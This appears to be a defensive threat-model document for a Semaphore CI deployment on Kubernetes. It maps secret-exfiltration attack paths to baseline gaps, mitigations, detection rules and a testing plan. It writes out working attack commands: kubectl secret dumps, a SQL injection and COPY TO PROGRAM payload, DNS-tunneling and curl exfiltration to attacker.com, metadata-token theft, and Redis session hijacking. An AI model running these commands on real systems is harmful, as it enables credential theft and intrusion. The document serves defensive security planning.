# Attack Tree: Secret Exfiltration

## Goal
Steal sensitive secrets (database credentials, API keys, SSH keys, cloud credentials) from Semaphore platform.

## Attack Tree

```
[Root] Exfiltrate Semaphore Secrets
│
├─[OR]─ Access Kubernetes Secrets
│   │
│   ├─[AND]─ Direct kubectl Access
│   │   ├─ Obtain kubeconfig or service account token
│   │   ├─ List secrets: kubectl get secrets --all-namespaces
│   │   └─ Decode base64: kubectl get secret postgres -o json | jq -r '.data | map_values(@base64d)'
│   │
│   ├─[AND]─ Via Overprivileged Pod
│   │   ├─ Gain shell access to Controller or Guard pod
│   │   ├─ Use pod's service account to query API server
│   │   └─ Read secrets via Kubernetes API
│   │
│   ├─[AND]─ etcd Direct Access
│   │   ├─ Gain access to master node or etcd pod
│   │   ├─ Read secrets from etcd (unencrypted by default in baseline)
│   │   └─ Extract all secrets without audit trail
│   │
│   └─[AND]─ Kubernetes Dashboard Exploit
│       ├─ Access unsecured Kubernetes Dashboard (if deployed)
│       ├─ Use overprivileged dashboard service account
│       └─ Browse and download secrets via UI
│
├─[OR]─ Access PostgreSQL Database
│   │
│   ├─[AND]─ Direct Database Connection
│   │   ├─ Obtain DB credentials from Kubernetes secret
│   │   ├─ No NetworkPolicy blocks external access (BASELINE: YES)
│   │   ├─ Connect to postgres:5432 from compromised pod
│   │   └─ SELECT * FROM encrypted_secrets; (weakly encrypted)
│   │
│   ├─[AND]─ SQL Injection
│   │   ├─ Find SQLi vulnerability in ProjectHub or Guard
│   │   ├─ Extract secrets table: ' UNION SELECT secret_value FROM encrypted_secrets--
│   │   └─ Exfiltrate via DNS tunneling: COPY (SELECT secret) TO PROGRAM 'dig `base64 secret`.attacker.com'
│   │
│   ├─[AND]─ PostgreSQL Log Mining
│   │   ├─ Access PostgreSQL logs (often contain query parameters)
│   │   ├─ Search for secrets logged in plaintext during debugging
│   │   └─ Extract from log aggregation system (Loki)
│   │
│   └─[AND]─ Database Backup Theft
│       ├─ Access to database backups (pg_dump files)
│       ├─ Backups stored unencrypted in GCS bucket
│       └─ Download backup, extract secrets offline
│
├─[OR]─ Access MinIO/S3 Object Storage
│   │
│   ├─[AND]─ Stolen MinIO Credentials
│   │   ├─ Extract MinIO access/secret key from Kubernetes secret
│   │   ├─ Use mc (MinIO client) to list buckets
│   │   └─ Download artifacts containing embedded secrets
│   │
│   ├─[AND]─ Publicly Accessible Bucket
│   │   ├─ Misconfigured bucket policy allows anonymous access
│   │   ├─ Enumerate bucket contents via HTTP
│   │   └─ Download build artifacts with .env files
│   │
│   └─[AND]─ Pre-Signed URL Abuse
│       ├─ Intercept or guess pre-signed artifact download URLs
│       ├─ URLs don't expire (long TTL)
│       └─ Access artifacts without authentication
│
├─[OR]─ Intercept Secrets in Transit
│   │
│   ├─[AND]─ Pod-to-Pod Traffic Sniffing
│   │   ├─ Deploy sniffer pod in same namespace
│   │   ├─ No encryption between services (HTTP, not HTTPS)
│   │   ├─ Capture secrets passed in API requests (e.g., Guard → Controller)
│   │   └─ Extract JWT tokens, DB passwords from packet captures
│   │
│   ├─[AND]─ RabbitMQ Message Interception
│   │   ├─ Access RabbitMQ management interface (default: guest/guest)
│   │   ├─ Subscribe to job queues
│   │   └─ Read messages containing secrets (environment variables)
│   │
│   └─[AND]─ Man-in-the-Middle on External API Calls
│       ├─ Intercept traffic to GitHub API (if TLS cert validation disabled)
│       ├─ Capture GitHub personal access tokens
│       └─ Use stolen tokens to access private repositories
│
├─[OR]─ Extract from Application Memory
│   │
│   ├─[AND]─ Process Memory Dump
│   │   ├─ Exec into pod with debug tools (gdb, gcore)
│   │   ├─ Dump process memory: gcore <PID>
│   │   └─ Search memory dump for secret patterns (e.g., "password=", API keys)
│   │
│   ├─[AND]─ Redis Cache Dump
│   │   ├─ Access Redis instance (default: no authentication)
│   │   ├─ Dump all keys: redis-cli --scan --pattern '*'
│   │   └─ Extract cached session tokens, API keys
│   │
│   └─[AND]─ Application Debug Endpoints
│       ├─ Access /debug/vars or /metrics endpoints
│       ├─ Endpoints expose environment variables
│       └─ Secrets visible in process environment
│
└─[OR]─ Social Engineering / Insider Threat
    │
    ├─[AND]─ Phishing Cluster Admin
    │   ├─ Send phishing email to DevOps team
    │   ├─ Steal kubeconfig file from developer laptop
    │   └─ Use admin access to read all secrets
    │
    ├─[AND]─ Compromised CI/CD Pipeline
    │   ├─ Inject malicious step in GitHub Actions workflow
    │   ├─ Workflow has access to secrets via ${{ secrets.DB_PASSWORD }}
    │   └─ Exfiltrate secrets to attacker server
    │
    └─[AND]─ Supply Chain - Malicious Container Image
        ├─ Trojanized base image in Docker Hub
        ├─ Image embedded with exfiltration script
        └─ On pod startup, script sends /var/run/secrets to C2
```

## Attack Paths by Data Sensitivity

### Critical Secrets: Database Credentials

**Impact:** Full access to all user data, projects, job history, encrypted secrets.

**Attack Path 1: Kubernetes Secret → PostgreSQL Access**
```bash
# Step 1: Extract secret from Kubernetes
kubectl get secret postgres-credentials -o json | jq -r '.data.password' | base64 -d
# Output: "MySecretPassword123"

# Step 2: Connect to database (no NetworkPolicy in baseline)
kubectl run -it --rm psql --image=postgres:13 --restart=Never -- \
  psql -h postgres -U semaphore_user -d semaphore_production

# Step 3: Dump all secrets
semaphore_production=> SELECT project_name, secret_name, encrypted_value FROM encrypted_secrets;

# Step 4: Attempt to decrypt (weak encryption key in older versions)
# If encryption uses ECB mode or hardcoded key, decrypt offline
```

**Baseline Gaps:**
- ❌ Secrets stored as Kubernetes Secrets (base64 only, etcd not encrypted)
- ❌ No NetworkPolicy prevents pod→PostgreSQL direct access
- ❌ Database credentials same across all environments
- ❌ No secret rotation policy

**Mitigations:**
- ✅ Phase 04: External Secrets Operator + Vault (secrets never in Kubernetes)
- ✅ Phase 08: NetworkPolicy (only Controller can access PostgreSQL)
- ✅ Phase 02: Workload Identity (no static credentials)
- ✅ Phase 04: Automatic secret rotation every 90 days

---

### Critical Secrets: Cloud Provider Credentials (GCP Service Account Keys)

**Impact:** Full GCP project access, ability to provision resources, access other projects.

**Attack Path 2: GKE Workload Identity Bypass**
```bash
# Baseline: If Workload Identity not configured, pods use node service account
# Step 1: Query metadata server from compromised pod
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

{
  "access_token": "ya29.c.EkoB...",
  "expires_in": 3600,
  "token_type": "Bearer"
}

# Step 2: Use token to access GCS buckets
curl -H "Authorization: Bearer ya29.c.EkoB..." \
  https://storage.googleapis.com/storage/v1/b/semaphore-backups/o

# Step 3: Download database backups containing secrets
gsutil cp gs://semaphore-backups/postgres-backup-2025-01-10.sql.gz /tmp/
zcat /tmp/postgres-backup-2025-01-10.sql.gz | grep 'INSERT INTO encrypted_secrets'
```

**Baseline Gaps:**
- ❌ Node service account has overly broad permissions (Editor role)
- ❌ Workload Identity not enforced (pods inherit node SA)
- ❌ GCS buckets not restricted by VPC Service Controls

**Mitigations:**
- ✅ Phase 09: Workload Identity (pod SA ≠ node SA)
- ✅ Phase 02: Least privilege node SA (minimal permissions)
- ✅ Phase 11: Encrypted backups with separate IAM permissions

---

### High Sensitivity: User Session Tokens

**Impact:** Account takeover, access to private projects, trigger malicious builds.

**Attack Path 3: Redis Session Hijacking**
```bash
# Step 1: Access Redis from any pod (no auth in baseline)
kubectl exec -it deployment/front -- redis-cli -h redis

# Step 2: Enumerate all session keys
redis:6379> KEYS session:*
1) "session:user:123:token"
2) "session:user:456:token"

# Step 3: Retrieve JWT token
redis:6379> GET session:user:123:token
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiJ9..."

# Step 4: Use stolen token to authenticate as admin
curl -H "Authorization: Bearer eyJhbGci..." \
  https://semaphore.local/api/v1/projects
```

**Baseline Gaps:**
- ❌ Redis has no password authentication (default config)
- ❌ No NetworkPolicy restricts Redis access (all pods can connect)
- ❌ Session tokens have long expiration (24 hours)
- ❌ No detection of session token reuse from different IPs

**Mitigations:**
- ✅ Phase 08: NetworkPolicy (only Guard and Front access Redis)
- ✅ Phase 04: Redis authentication enabled
- ✅ Phase 07: Anomaly detection on session token usage patterns
- ✅ JWT short expiration (1 hour) + refresh tokens

---

### High Sensitivity: GitHub Personal Access Tokens

**Impact:** Access to source code, ability to push malicious commits, steal other secrets from repos.

**Attack Path 4: MinIO Artifact Bucket Enumeration**
```bash
# Step 1: Extract MinIO credentials from Kubernetes secret
kubectl get secret minio-credentials -o json | \
  jq -r '.data | {accessKey: .accessKey, secretKey: .secretKey} | map_values(@base64d)'

{
  "accessKey": "minioadmin",
  "secretKey": "minioadmin"  # Default creds still in use!
}

# Step 2: Use mc (MinIO client) to list buckets
mc alias set semaphore https://minio.semaphore.local minioadmin minioadmin
mc ls semaphore/artifacts/

# Step 3: Find .env files or credentials in build artifacts
mc find semaphore/artifacts --name "*.env"
mc cat semaphore/artifacts/project-123/build-456/.env

GITHUB_TOKEN=ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ123456
DATABASE_URL=postgresql://user:pass@host/db
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
```

**Baseline Gaps:**
- ❌ MinIO uses default credentials (minioadmin/minioadmin)
- ❌ No scanning of build artifacts for leaked secrets
- ❌ Developers commit .env files to repositories
- ❌ No secret detection in CI/CD pipeline

**Mitigations:**
- ✅ Phase 04: Strong random MinIO credentials, rotated
- ✅ Phase 03: TruffleHog secret scanning in CI/CD
- ✅ Phase 03: .env files automatically excluded from artifacts
- ✅ Pre-commit hooks to detect secrets before commit

---

## Exfiltration Methods

Once secrets are obtained, attackers use various methods to exfiltrate data:

### DNS Tunneling (Bypasses Egress Restrictions)
```bash
# Encode secret and send via DNS queries
SECRET=$(cat /var/run/secrets/database-password)
for chunk in $(echo $SECRET | base64 | fold -w 63); do
  dig $chunk.exfil.attacker.com
done
```

**Detection:**
- ✅ Phase 08: Egress NetworkPolicy blocks non-whitelisted DNS
- ✅ Phase 07: Prometheus alert on high DNS query rate
- ✅ Phase 06: Falco detects suspicious DNS patterns

### HTTPS POST to External Server
```bash
# Standard exfiltration via HTTPS (harder to detect)
kubectl get secrets -A -o json | \
  curl -X POST -d @- https://attacker.com/exfil
```

**Detection:**
- ✅ Phase 08: Egress NetworkPolicy whitelists only required domains
- ✅ Phase 07: Anomaly detection on outbound traffic volume
- ✅ Phase 06: Falco detects curl/wget from unexpected processes

### Image Layer Smuggling
```bash
# Hide secrets in container image layers, push to public registry
echo $SECRET > /tmp/secret.txt
docker build -t attacker/innocent-image:latest .
docker push attacker/innocent-image:latest
```

**Detection:**
- ✅ Phase 03: Image scanning detects embedded secrets
- ✅ Phase 08: Egress NetworkPolicy blocks unauthorized registries
- ✅ Phase 09: Binary Authorization prevents untrusted images

---

## Risk Assessment

| Secret Type | Storage Location | Baseline Risk | Post-Mitigation Risk | MTTD (Baseline) | MTTD (Hardened) |
|-------------|------------------|---------------|----------------------|-----------------|-----------------|
| **Database credentials** | Kubernetes Secret | **CRITICAL** | LOW | Never | 5 minutes |
| **GCP service account keys** | Node metadata | **CRITICAL** | LOW | Never | 2 minutes |
| **GitHub PATs** | PostgreSQL + artifacts | **HIGH** | MEDIUM | Never | 15 minutes |
| **Session tokens** | Redis | **HIGH** | LOW | Never | 10 minutes |
| **MinIO access keys** | Kubernetes Secret | **HIGH** | LOW | Never | 5 minutes |
| **RabbitMQ credentials** | Kubernetes Secret | **MEDIUM** | LOW | Never | 5 minutes |
| **TLS private keys** | Kubernetes Secret | **MEDIUM** | LOW | Never | 5 minutes |

**MTTD = Mean Time to Detect** (how long until unauthorized access is detected)

---

## Testing Plan

### Test 1: Kubernetes Secret Access (Should Be Blocked)
```bash
# Attempt to read secrets from agent pod
kubectl exec -it deployment/controller -- sh -c \
  'wget --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
   https://kubernetes.default.svc/api/v1/namespaces/default/secrets/postgres-credentials'

# Expected result: 403 Forbidden
# Expected detection: Kubernetes audit log + Falco alert
```

### Test 2: PostgreSQL Direct Access (Should Be Blocked)
```bash
# Attempt to connect to PostgreSQL from Front pod
kubectl exec -it deployment/front -- nc -zv postgres 5432

# Expected result: Connection timeout (NetworkPolicy blocks)
# Expected detection: None needed (connection never established)
```

### Test 3: Redis Unauthorized Access (Should Be Blocked)
```bash
# Attempt to access Redis from unauthorized pod
kubectl run -it --rm redis-test --image=redis:7 --restart=Never -- \
  redis-cli -h redis KEYS '*'

# Expected result: (error) NOAUTH Authentication required
# Expected detection: Redis logs + Falco alert on failed auth
```

### Test 4: Secret Exfiltration Detection
```bash
# Simulate exfiltration attempt
kubectl exec -it deployment/controller -- sh -c \
  'curl -X POST -d "$(cat /etc/hostname)" https://attacker.com/exfil'

# Expected detection:
# 1. Egress NetworkPolicy blocks connection
# 2. Falco alert: "Unexpected network connection from controller pod"
# 3. Prometheus alert: "Unusual outbound traffic detected"
```

---

## Mitigation Summary

| Phase | Security Control | Secrets Protected | Risk Reduction |
|-------|------------------|-------------------|----------------|
| **02** | Workload Identity, least privilege SA | Cloud credentials | 90% |
| **04** | External Secrets Operator + Vault | All secrets | 95% |
| **04** | Secret rotation policy | DB, API keys | 80% |
| **06** | Falco runtime detection | All (detection) | N/A (visibility) |
| **07** | Anomaly detection (UEBA) | Session tokens | 70% |
| **08** | NetworkPolicies | All (lateral movement) | 85% |
| **09** | Binary Authorization | Image-embedded secrets | 75% |
| **03** | Secret scanning (TruffleHog) | All (prevention) | 90% |

---

## References

- **Secret Management Best Practices:** https://kubernetes.io/docs/concepts/configuration/secret/
- **External Secrets Operator:** https://external-secrets.io/
- **HashiCorp Vault on Kubernetes:** https://developer.hashicorp.com/vault/tutorials/kubernetes
- **GKE Workload Identity:** https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity
- **Secret Scanning Tools:** https://github.com/trufflesecurity/truffleHog
